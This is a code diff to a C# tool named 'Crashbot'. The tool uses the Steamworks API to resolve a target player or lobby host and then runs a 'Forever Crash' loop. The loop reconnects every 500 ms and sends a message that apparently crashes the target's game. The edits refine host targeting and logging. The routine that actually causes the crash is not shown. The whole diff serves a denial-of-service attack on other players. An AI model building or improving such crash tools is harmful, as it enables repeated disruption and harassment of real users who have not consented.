@@ -73,7 +73,7 @@ namespace Crashbot
 
                 // Initiate the connection
                 var t = new CSteamID(target);
-                var res = Steamworks.SteamFriends.RequestUserInformation(t, false);
+                var res = Steamworks.SteamFriends.RequestUserInformation(t, true);
                 Steamworks.SteamAPI.RunCallbacks();
 
                 string targetName = Steamworks.SteamFriends.GetFriendPersonaName(t);
@@ -125,10 +125,11 @@ namespace Crashbot
 
                 // Forever Crash
                 int count = 1;
+                ulong tmp_target = target;
                 while (crashed)
                 {
-                    target = Program.VerifyHostSteamid(t, target);
-                    var (conn_x, _) = ConnectAndWait(target, LongTimeoutOptions);
+                    tmp_target = Program.VerifyHostSteamid(t, target);
+                    var (conn_x, _) = ConnectAndWait(tmp_target, LongTimeoutOptions);
                     Program.ReadOneAndSendOne(conn_x, 0, 0, 0);
                     Thread.Sleep(500);
                     Steamworks.SteamNetworkingSockets.CloseConnection(conn_x, 0, string.Empty, false);
@@ -173,7 +174,7 @@ namespace Crashbot
 
                 if (original != host_steamid)
                 {
-                    Console.WriteLine($"[{DateTime.Now}] Target is not host");
+                    Console.WriteLine($"[{DateTime.Now}] Target is not host. Targeting: {host_steamid}");
                     return host_steamid;
                 }
             }
